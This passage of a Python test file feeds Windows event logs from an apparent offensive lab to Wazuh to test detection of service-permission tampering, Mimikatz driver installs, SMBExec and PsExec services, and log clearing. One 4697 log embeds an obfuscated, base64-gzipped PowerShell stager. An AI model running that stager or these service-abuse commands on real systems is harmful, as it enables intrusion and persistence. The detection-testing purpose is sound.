not require administrative privilege, and the user does not choose to start the program using Run as administrator."}, "eventdata": {"subjectUserSid": "S-1-5-18", "subjectUserName": "FS03$", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x3e7", "newProcessId": "0xaf0", "newProcessName": "C:\\Windows\\System32\\taskhostex.exe", "tokenElevationType": "%%1936", "processId": "0x2f0", "commandLine": "taskhostex.exe", "targetUserSid": "S-1-0-0", "targetLogonId": "0x0"}}}'''
        ]

        responses = send_multiple_logs(logs, location="stdin", log_format="json")

        # Ensure we receive a response for each log sent
        self.assertEqual(len(responses), len(logs))

        for _, response in enumerate(responses):
            self.assertEqual(response.status, LogtestStatus.RuleMatch)
            self.assertEqual(response.decoder, 'json')

            # Example: Set expected Wazuh rule ID and level when analyzing logs
            # expected_rule_id = None  # Replace with actual rule ID
            # expected_rule_level = None  # Replace with actual rule level

            # self.assertEqual(response.rule_id, expected_rule_id)
            # self.assertEqual(response.rule_level, expected_rule_level)

        # TODO: Write the expected result as test cases when the logs are analyzed by Wazuh.
        self.fail("Test not implemented yet. Define expected results.")

    def test_id4688_service_permissions_modified_registry(self) -> None:
        # Logs extracted from EVTX file
        logs = [
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4688", "version": "2", "level": "0", "task": "13312", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T10:05:29.4320687Z", "eventRecordID": "2916400", "processID": "4", "threadID": "6208", "channel": "Security", "computer": "win10-02.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "A new process has been created.\n\nCreator Subject:\n\tSecurity ID:\t\tS-1-5-21-4230534742-2542757381-3142984815-1111\n\tAccount Name:\t\tadmmig\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x5F72FEE\n\nTarget Subject:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\t-\n\tAccount Domain:\t\t-\n\tLogon ID:\t\t0x0\n\nProcess Information:\n\tNew Process ID:\t\t0x18c4\n\tNew Process Name:\tC:\\Windows\\System32\\reg.exe\n\tToken Elevation Type:\t%%1936\n\tMandatory Label:\t\tS-1-16-12288\n\tCreator Process ID:\t0x2924\n\tCreator Process Name:\tC:\\Windows\\System32\\cmd.exe\n\tProcess Command Line:\treg  add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\XblGameSave\\Security\" /v Security /t REG_BINARY /d fe340ead\n\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\n\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\n\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\n\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."}, "eventdata": {"subjectUserSid": "S-1-5-21-4230534742-2542757381-3142984815-1111", "subjectUserName": "admmig", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x5f72fee", "newProcessId": "0x18c4", "newProcessName": "C:\\Windows\\System32\\reg.exe", "tokenElevationType": "%%1936", "processId": "0x2924", "commandLine": "reg  add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\XblGameSave\\Security\" /v Security /t REG_BINARY /d fe340ead", "targetUserSid": "S-1-0-0", "targetLogonId": "0x0", "parentProcessName": "C:\\Windows\\System32\\cmd.exe", "mandatoryLabel": "S-1-16-12288"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4688", "version": "2", "level": "0", "task": "13312", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T10:05:36.2981324Z", "eventRecordID": "2916401", "processID": "4", "threadID": "8544", "channel": "Security", "computer": "win10-02.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "A new process has been created.\n\nCreator Subject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tWIN10-02$\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x3E7\n\nTarget Subject:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\tadmmig\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x5F72FEE\n\nProcess Information:\n\tNew Process ID:\t\t0x2af0\n\tNew Process Name:\tC:\\Windows\\System32\\dllhost.exe\n\tToken Elevation Type:\t%%1936\n\tMandatory Label:\t\tS-1-16-12288\n\tCreator Process ID:\t0x318\n\tCreator Process Name:\tC:\\Windows\\System32\\svchost.exe\n\tProcess Command Line:\tC:\\Windows\\system32\\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}\n\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\n\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\n\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\n\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."}, "eventdata": {"subjectUserSid": "S-1-5-18", "subjectUserName": "WIN10-02$", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x3e7", "newProcessId": "0x2af0", "newProcessName": "C:\\Windows\\System32\\dllhost.exe", "tokenElevationType": "%%1936", "processId": "0x318", "commandLine": "C:\\Windows\\system32\\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}", "targetUserSid": "S-1-0-0", "targetUserName": "admmig", "targetDomainName": "OFFSEC", "targetLogonId": "0x5f72fee", "parentProcessName": "C:\\Windows\\System32\\svchost.exe", "mandatoryLabel": "S-1-16-12288"}}}'''
        ]

        responses = send_multiple_logs(logs, location="stdin", log_format="json")

        # Ensure we receive a response for each log sent
        self.assertEqual(len(responses), len(logs))

        for _, response in enumerate(responses):
            self.assertEqual(response.status, LogtestStatus.RuleMatch)
            self.assertEqual(response.decoder, 'json')

            # Example: Set expected Wazuh rule ID and level when analyzing logs
            # expected_rule_id = None  # Replace with actual rule ID
            # expected_rule_level = None  # Replace with actual rule level

            # self.assertEqual(response.rule_id, expected_rule_id)
            # self.assertEqual(response.rule_level, expected_rule_level)

        # TODO: Write the expected result as test cases when the logs are analyzed by Wazuh.
        self.fail("Test not implemented yet. Define expected results.")

    def test_id4688_service_permissions_modified_sc(self) -> None:
        # Logs extracted from EVTX file
        logs = [
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4688", "version": "2", "level": "0", "task": "13312", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T08:53:42.1316287Z", "eventRecordID": "2915042", "processID": "4", "threadID": "7912", "channel": "Security", "computer": "win10-02.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "A new process has been created.\n\nCreator Subject:\n\tSecurity ID:\t\tS-1-5-21-4230534742-2542757381-3142984815-1111\n\tAccount Name:\t\tadmmig\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x5F72FEE\n\nTarget Subject:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\t-\n\tAccount Domain:\t\t-\n\tLogon ID:\t\t0x0\n\nProcess Information:\n\tNew Process ID:\t\t0x1d28\n\tNew Process Name:\tC:\\Windows\\System32\\sc.exe\n\tToken Elevation Type:\t%%1936\n\tMandatory Label:\t\tS-1-16-12288\n\tCreator Process ID:\t0x2924\n\tCreator Process Name:\tC:\\Windows\\System32\\cmd.exe\n\tProcess Command Line:\tsc  sdset xboxgip \"D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)\n\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\n\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\n\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\n\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."}, "eventdata": {"subjectUserSid": "S-1-5-21-4230534742-2542757381-3142984815-1111", "subjectUserName": "admmig", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x5f72fee", "newProcessId": "0x1d28", "newProcessName": "C:\\Windows\\System32\\sc.exe", "tokenElevationType": "%%1936", "processId": "0x2924", "commandLine": "sc  sdset xboxgip \"D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)", "targetUserSid": "S-1-0-0", "targetLogonId": "0x0", "parentProcessName": "C:\\Windows\\System32\\cmd.exe", "mandatoryLabel": "S-1-16-12288"}}}'''
        ]

        responses = send_multiple_logs(logs, location="stdin", log_format="json")

        # Ensure we receive a response for each log sent
        self.assertEqual(len(responses), len(logs))

        for _, response in enumerate(responses):
            self.assertEqual(response.status, LogtestStatus.RuleMatch)
            self.assertEqual(response.decoder, 'json')

            # Example: Set expected Wazuh rule ID and level when analyzing logs
            # expected_rule_id = None  # Replace with actual rule ID
            # expected_rule_level = None  # Replace with actual rule level

            # self.assertEqual(response.rule_id, expected_rule_id)
            # self.assertEqual(response.rule_level, expected_rule_level)

        # TODO: Write the expected result as test cases when the logs are analyzed by Wazuh.
        self.fail("Test not implemented yet. Define expected results.")

    def test_id4697_msf_payload_deployed_via_service(self) -> None:
        # Logs extracted from EVTX file
        logs = [
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4697", "version": "0", "level": "0", "task": "12289", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-04-21T14:56:43.2341468Z", "eventRecordID": "354577", "processID": "584", "threadID": "5408", "channel": "Security", "computer": "srvdefender01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "A service was installed in the system.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-21-4230534742-2542757381-3142984815-1111\n\tAccount Name:\t\tadmmig\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x1659379\n\nService Information:\n\tService Name: \t\tiOWamcEn\n\tService File Name:\t%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -noni -c \"if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAPU7gGACA7VW+2/aSBD+OZHyP1gVErZKsHlcEyJVurUdHk0gBof3odNiL/Y2ay+xFwjp9X+/WbDbVE3v2pPO4rGPmdmZb76d8WoTe4LyWBG1Zah8Ojs9cXCCI0UtPH5YlZQCtWhLOzmB9ULwUXmvqHO0Xts8wjReXF1ZmyQhsTjOyy0iUJqSaMkoSVVN+UsZhyQh53fLj8QTyiel8Ge5xfgSs0xsb2EvJMo5in25d8s9LH0pu2tGhVr844+iNj+vLMrXjxvMUrXo7lNBorLPWFFTPmvywPv9mqjFLvUSnvKVKI9pXKuWh3GKV6QH1rakS0TI/bSoQQzwSYjYJLEC0Uj146ZahKGTcA/5fkLStFhS5tLwfLH4XZ1npw42saARKXdiQRK+dkmypR5Jy20c+4wMyGoBWq5IaBwsNA3EtvyBqIV4w1hJ+RUzao/scsx+Vkl9qQRSjki0EiTxuyi73N8wctQrvuKmTLsGT556QO3z2enZ6SrnCd42ti95AqOT+WFMwDfV4Sk9yL1XjJLShXOw4MkepoX7ZEO0xRdklUJqL0s/Vq/ksiD53DD2EazNR5z6C9DJkll4vJSrP6akTVY0JvY+xhH1ctapryFMVowcIiznYj3wSS1mG8S3CSMBFhI1mejv1K4jKr7omhvKfJIgD7KUgleQQO1bZ46JUIuduEsiQOg4B+YVVsB1kktn/N7np8s5CBUthtO0pDgbuGxeSXEJZsQvKShOabaFNoIfhsWv7nY3TFAPpyI3t9COKGanWTxORbLxIGUQ+b27Jh7FTAJRUtrUJ+bepUF+avFVGCzMGFwBsLSFNMCKDN8VkggJOCiTrpVdIjrRmpEIRA5XvslwABc84/mBODggfvFb93IeH0krYcjjf+Ec5NZlXJSUEU0E1A0J6YE//+nwFxUD3LASkuVAzS/G3NwLSedC0AieJRkzSA4AJAKCbyY8MnFK3tWP1UF9o99RB8EztdvurCPcLnztTsxopTPsri4dYfCI1jq861mp02peIroLdt5lD3n+B580XJDrU6NziXzrtt8OJ6FnGveoDWvBdNgR0w5q34ceMxy7rbvT1KC79ljaOtrw6vX2xEC1Wv2uZjwAblNaCR6Q34vo7ukWxlAG727NTmoaHXb9wRosx9XmbMzaer0ZrsY8dd9NbV3XGz62u3uETO7XuvtJZcDv215k1mOuN6z6A7pGyIqvR02T30zNBDn6CAdrboX+hVUNLIRaF5TM+sOm2e83TTRsfXy0G3qgN8YTHJrjUZXO1pNBCPPmrt2/0Y16xyfPfLYD4Foc4WAAMoFV9cIVyNhvkfm2x9MqfjA5MkGmOXtErXC6bjoM9u+HVY5GrDfB6Ha2b+p6ZerUUdvg41aA+iCOA7OPUbq1n229MvK5P/6tN13powm70G2r74QTGbO+juTvrm3feLPKzru7qJvGoxXRiC2rvt4YXprx7iZwtoHfH18Mnnr7JZw71PXRG8kmoFPBC8d+5QVRflTbuzhJQ8yAQFC28/va5Ekzq8QOp1JDVQ+d+4EkMWHQ+qA55sxHjHFPtoFDzYYWdGwMsk8NYVirvjrSlC+C2tcGkS9dXc3AS7hKku7lWxIHIiwZTzXDgHJvPNUNCPPnI7P4eq8eTJVkuzhikxtnB+OavGSFVMTx/4tZdrVD+PP/DbOva/+w+1M4GqUs5u/Wv134JVR/OfYxpgIkXShOjBz74usQZAx58d4gEwP5X2WPfOm724jzHrxOnJ3+DTnHlctdCgAA''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);\"\n\tService Type: \t\t0x10\n\tService Start Type:\t3\n\tService Account: \t\tLocalSystem"}, "eventdata": {"subjectUserSid": "S-1-5-21-4230534742-2542757381-3142984815-1111", "subjectUserName": "admmig", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x1659379", "serviceName": "iOWamcEn", "serviceFileName": "%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -noni -c \"if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAPU7gGACA7VW+2/aSBD+OZHyP1gVErZKsHlcEyJVurUdHk0gBof3odNiL/Y2ay+xFwjp9X+/WbDbVE3v2pPO4rGPmdmZb76d8WoTe4LyWBG1Zah8Ojs9cXCCI0UtPH5YlZQCtWhLOzmB9ULwUXmvqHO0Xts8wjReXF1ZmyQhsTjOyy0iUJqSaMkoSVVN+UsZhyQh53fLj8QTyiel8Ge5xfgSs0xsb2EvJMo5in25d8s9LH0pu2tGhVr844+iNj+vLMrXjxvMUrXo7lNBorLPWFFTPmvywPv9mqjFLvUSnvKVKI9pXKuWh3GKV6QH1rakS0TI/bSoQQzwSYjYJLEC0Uj146ZahKGTcA/5fkLStFhS5tLwfLH4XZ1npw42saARKXdiQRK+dkmypR5Jy20c+4wMyGoBWq5IaBwsNA3EtvyBqIV4w1hJ+RUzao/scsx+Vkl9qQRSjki0EiTxuyi73N8wctQrvuKmTLsGT556QO3z2enZ6SrnCd42ti95AqOT+WFMwDfV4Sk9yL1XjJLShXOw4MkepoX7ZEO0xRdklUJqL0s/Vq/ksiD53DD2EazNR5z6C9DJkll4vJSrP6akTVY0JvY+xhH1ctapryFMVowcIiznYj3wSS1mG8S3CSMBFhI1mejv1K4jKr7omhvKfJIgD7KUgleQQO1bZ46JUIuduEsiQOg4B+YVVsB1kktn/N7np8s5CBUthtO0pDgbuGxeSXEJZsQvKShOabaFNoIfhsWv7nY3TFAPpyI3t9COKGanWTxORbLxIGUQ+b27Jh7FTAJRUtrUJ+bepUF+avFVGCzMGFwBsLSFNMCKDN8VkggJOCiTrpVdIjrRmpEIRA5XvslwABc84/mBODggfvFb93IeH0krYcjjf+Ec5NZlXJSUEU0E1A0J6YE//+nwFxUD3LASkuVAzS/G3NwLSedC0AieJRkzSA4AJAKCbyY8MnFK3tWP1UF9o99RB8EztdvurCPcLnztTsxopTPsri4dYfCI1jq861mp02peIroLdt5lD3n+B580XJDrU6NziXzrtt8OJ6FnGveoDWvBdNgR0w5q34ceMxy7rbvT1KC79ljaOtrw6vX2xEC1Wv2uZjwAblNaCR6Q34vo7ukWxlAG727NTmoaHXb9wRosx9XmbMzaer0ZrsY8dd9NbV3XGz62u3uETO7XuvtJZcDv215k1mOuN6z6A7pGyIqvR02T30zNBDn6CAdrboX+hVUNLIRaF5TM+sOm2e83TTRsfXy0G3qgN8YTHJrjUZXO1pNBCPPmrt2/0Y16xyfPfLYD4Foc4WAAMoFV9cIVyNhvkfm2x9MqfjA5MkGmOXtErXC6bjoM9u+HVY5GrDfB6Ha2b+p6ZerUUdvg41aA+iCOA7OPUbq1n229MvK5P/6tN13powm70G2r74QTGbO+juTvrm3feLPKzru7qJvGoxXRiC2rvt4YXprx7iZwtoHfH18Mnnr7JZw71PXRG8kmoFPBC8d+5QVRflTbuzhJQ8yAQFC28/va5Ekzq8QOp1JDVQ+d+4EkMWHQ+qA55sxHjHFPtoFDzYYWdGwMsk8NYVirvjrSlC+C2tcGkS9dXc3AS7hKku7lWxIHIiwZTzXDgHJvPNUNCPPnI7P4eq8eTJVkuzhikxtnB+OavGSFVMTx/4tZdrVD+PP/DbOva/+w+1M4GqUs5u/Wv134JVR/OfYxpgIkXShOjBz74usQZAx58d4gEwP5X2WPfOm724jzHrxOnJ3+DTnHlctdCgAA''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);\"", "serviceType": "0x10", "serviceStartType": "3", "serviceAccount": "LocalSystem"}}}'''
        ]

        responses = send_multiple_logs(logs, location="stdin", log_format="json")

        # Ensure we receive a response for each log sent
        self.assertEqual(len(responses), len(logs))

        for _, response in enumerate(responses):
            self.assertEqual(response.status, LogtestStatus.RuleMatch)
            self.assertEqual(response.decoder, 'json')

            # Example: Set expected Wazuh rule ID and level when analyzing logs
            # expected_rule_id = None  # Replace with actual rule ID
            # expected_rule_level = None  # Replace with actual rule level

            # self.assertEqual(response.rule_id, expected_rule_id)
            # self.assertEqual(response.rule_level, expected_rule_level)

        # TODO: Write the expected result as test cases when the logs are analyzed by Wazuh.
        self.fail("Test not implemented yet. Define expected results.")

    def test_id4697_new_service_for_mimikatz(self) -> None:
        # Logs extracted from EVTX file
        logs = [
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Eventlog", "providerGuid": "{fc65ddd8-d6ef-4962-83d5-6e5cfe9ce148}", "eventID": "1102", "version": "0", "level": "4", "task": "104", "opcode": "0", "keywords": "0x4020000000000000", "systemTime": "2021-03-26T16:17:29.2105621Z", "eventRecordID": "9213076", "processID": "336", "threadID": "484", "channel": "Security", "computer": "jump01.offsec.lan", "severityValue": "INFORMATION", "message": "The audit log was cleared.\nSubject:\n\tSecurity ID:\tS-1-5-21-4230534742-2542757381-3142984815-1111\n\tAccount Name:\tadmmig\n\tDomain Name:\tOFFSEC\n\tLogon ID:\t0xCC3C3"}, "eventdata": {}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4697", "version": "0", "level": "0", "task": "12289", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-03-26T16:17:35.4904245Z", "eventRecordID": "9213077", "processID": "692", "threadID": "11184", "channel": "Security", "computer": "jump01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "A service was installed in the system.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-21-4230534742-2542757381-3142984815-1111\n\tAccount Name:\t\tadmmig\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0xCC3C3\n\nService Information:\n\tService Name: \t\tmimidrv\n\tService File Name:\tC:\\TOOLS\\Security_tool\\Mimikatz-fev-2020\\mimidrv.sys\n\tService Type: \t\t0x1\n\tService Start Type:\t2\n\tService Account: \t\tLocalSystem"}, "eventdata": {"subjectUserSid": "S-1-5-21-4230534742-2542757381-3142984815-1111", "subjectUserName": "admmig", "subjectDomainName": "OFFSEC", "subjectLogonId": "0xcc3c3", "serviceName": "mimidrv", "serviceFileName": "C:\\TOOLS\\Security_tool\\Mimikatz-fev-2020\\mimidrv.sys", "serviceType": "0x1", "serviceStartType": "2", "serviceAccount": "LocalSystem"}}}'''
        ]

        responses = send_multiple_logs(logs, location="stdin", log_format="json")

        # Ensure we receive a response for each log sent
        self.assertEqual(len(responses), len(logs))

        for _, response in enumerate(responses):
            self.assertEqual(response.status, LogtestStatus.RuleMatch)
            self.assertEqual(response.decoder, 'json')

            # Example: Set expected Wazuh rule ID and level when analyzing logs
            # expected_rule_id = None  # Replace with actual rule ID
            # expected_rule_level = None  # Replace with actual rule level

            # self.assertEqual(response.rule_id, expected_rule_id)
            # self.assertEqual(response.rule_level, expected_rule_level)

        # TODO: Write the expected result as test cases when the logs are analyzed by Wazuh.
        self.fail("Test not implemented yet. Define expected results.")

    def test_id7045_4697_smbexec_service_registration(self) -> None:
        # Logs extracted from EVTX file
        logs = [
            r'''{"win": {"system": {"providerName": "Service Control Manager", "providerGuid": "{555908d1-a6d7-4695-8e1e-26931d2012f4}", "eventID": "7045", "version": "0", "level": "4", "task": "0", "opcode": "0", "keywords": "0x8080000000000000", "systemTime": "2021-12-13T12:55:45.2500845Z", "eventRecordID": "1467331", "processID": "580", "threadID": "4544", "channel": "System", "computer": "rootdc1.offsec.lan", "severityValue": "INFORMATION", "message": "A service was installed in the system.\n\nService Name:  BTOBTO\nService File Name:  %COMSPEC% /Q /c echo cd  ^> \\\\127.0.0.1\\C$\\__output 2^>^&1 > %TEMP%\\execute.bat & %COMSPEC% /Q /c %TEMP%\\execute.bat & del %TEMP%\\execute.bat\nService Type:  user mode service\nService Start Type:  demand start\nService Account:  LocalSystem"}, "eventdata": {"serviceName": "BTOBTO", "imagePath": "%COMSPEC% /Q /c echo cd  ^> \\\\127.0.0.1\\C$\\__output 2^>^&1 > %TEMP%\\execute.bat & %COMSPEC% /Q /c %TEMP%\\execute.bat & del %TEMP%\\execute.bat", "serviceType": "user mode service", "startType": "demand start", "accountName": "LocalSystem"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4697", "version": "0", "level": "0", "task": "12289", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-12-13T12:55:45.2509055Z", "eventRecordID": "236864754", "processID": "596", "threadID": "4516", "channel": "Security", "computer": "rootdc1.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "A service was installed in the system.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-21-4230534742-2542757381-3142984815-1111\n\tAccount Name:\t\tadmmig\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x2CFF42B44\n\nService Information:\n\tService Name: \t\tBTOBTO\n\tService File Name:\t%COMSPEC% /Q /c echo cd  ^> \\\\127.0.0.1\\C$\\__output 2^>^&1 > %TEMP%\\execute.bat & %COMSPEC% /Q /c %TEMP%\\execute.bat & del %TEMP%\\execute.bat\n\tService Type: \t\t0x10\n\tService Start Type:\t3\n\tService Account: \t\tLocalSystem"}, "eventdata": {"subjectUserSid": "S-1-5-21-4230534742-2542757381-3142984815-1111", "subjectUserName": "admmig", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x2cff42b44", "serviceName": "BTOBTO", "serviceFileName": "%COMSPEC% /Q /c echo cd  ^> \\\\127.0.0.1\\C$\\__output 2^>^&1 > %TEMP%\\execute.bat & %COMSPEC% /Q /c %TEMP%\\execute.bat & del %TEMP%\\execute.bat", "serviceType": "0x10", "serviceStartType": "3", "serviceAccount": "LocalSystem"}}}'''
        ]

        responses = send_multiple_logs(logs, location="stdin", log_format="json")

        # Ensure we receive a response for each log sent
        self.assertEqual(len(responses), len(logs))

        for _, response in enumerate(responses):
            self.assertEqual(response.status, LogtestStatus.RuleMatch)
            self.assertEqual(response.decoder, 'json')

            # Example: Set expected Wazuh rule ID and level when analyzing logs
            # expected_rule_id = None  # Replace with actual rule ID
            # expected_rule_level = None  # Replace with actual rule level

            # self.assertEqual(response.rule_id, expected_rule_id)
            # self.assertEqual(response.rule_level, expected_rule_level)

        # TODO: Write the expected result as test cases when the logs are analyzed by Wazuh.
        self.fail("Test not implemented yet. Define expected results.")

    def test_id7045_7036_psexec_service_installation(self) -> None:
        # Logs extracted from EVTX file
        logs = [
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Eventlog", "providerGuid": "{fc65ddd8-d6ef-4962-83d5-6e5cfe9ce148}", "eventID": "104", "version": "0", "level": "4", "task": "104", "opcode": "0", "keywords": "0x8000000000000000", "systemTime": "2021-04-21T09:27:51.1817985Z", "eventRecordID": "471479", "processID": "492", "threadID": "12164", "channel": "System", "computer": "jump01.offsec.lan", "severityValue": "INFORMATION", "message": "The System log file was cleared."}, "eventdata": {}}}''',
            r'''{"win": {"system": {"providerName": "Service Control Manager", "providerGuid": "{555908d1-a6d7-4695-8e1e-26931d2012f4}", "eventID": "7045", "version": "0", "level": "4", "task": "0", "opcode": "0", "keywords": "0x8080000000000000", "systemTime": "2021-04-21T09:27:56.0825092Z", "eventRecordID": "471480", "processID": "708", "threadID": "10604", "channel": "System", "computer": "jump01.offsec.lan", "severityValue": "INFORMATION", "message": "A service was installed in the system.\n\nService Name:  PSEXESVC\nService File Name:  %SystemRoot%\\PSEXESVC.exe\nService Type:  user mode service\nService Start Type:  demand start\nService Account:  LocalSystem"}, "eventdata": {"serviceName": "PSEXESVC", "imagePath": "%SystemRoot%\\PSEXESVC.exe", "serviceType": "user mode service", "startType": "demand start", "accountName": "LocalSystem"}}}''',
            r'''{"win": {"system": {"providerName": "Service Control Manager", "providerGuid": "{555908d1-a6d7-4695-8e1e-26931d2012f4}", "eventID": "7036", "version": "0", "level": "4", "task": "0", "opcode": "0", "keywords": "0x8080000000000000", "systemTime": "2021-04-21T09:27:56.1021840Z", "eventRecordID": "471481", "processID": "708", "threadID": "5480", "channel": "System", "computer": "jump01.offsec.lan", "severityValue": "INFORMATION", "message": "The PSEXESVC service entered the running state."}, "eventdata": {"param1": "PSEXESVC", "param2": "running"}}}''',
            r'''{"win": {"system": {"providerName": "Service Control Manager", "providerGuid": "{555908d1-a6d7-4695-8e1e-26931d2012f4}", "eventID": "7036", "version": "0", "level": "4", "task": "0", "opcode": "0", "keywords": "0x8080000000000000", "systemTime": "2021-04-21T09:27:56.2488969Z", "eventRecordID": "471482", "processID": "708", "threadID": "10604", "channel": "System", "computer": "jump01.offsec.lan", "severityValue": "INFORMATION", "message": "The PSEXESVC service entered the stopped state."}, "eventdata": {"param1": "PSEXESVC", "param2": "stopped"}}}'''
        ]

        responses = send_multiple_logs(logs, location="stdin", log_format="json")

        # Ensure we receive a response for each log sent
        self.assertEqual(len(responses), len(logs))

        for _, response in enumerate(responses):
            self.assertEqual(response.status, LogtestStatus.RuleMatch)
            self.assertEqual(response.decoder, 'json')

            # Example: Set expected Wazuh rule ID and level when analyzing logs
            # expected_rule_id = None  # Replace with actual rule ID
            # expected_rule_level = None  # Replace with actual rule level

            # self.assertEqual(response.rule_id, expected_rule_id)
            # self.assertEqual(response.rule_level, expected_rule_level)

        # TODO: Write the expected result as test cases when the logs are analyzed by Wazuh.
        self.fail("Test not implemented yet. Define expected results.")

    def test_id7045_new_service_for_mimikatz_npcap(self) -> None:
        # Logs extracted from EVTX file
        logs = [
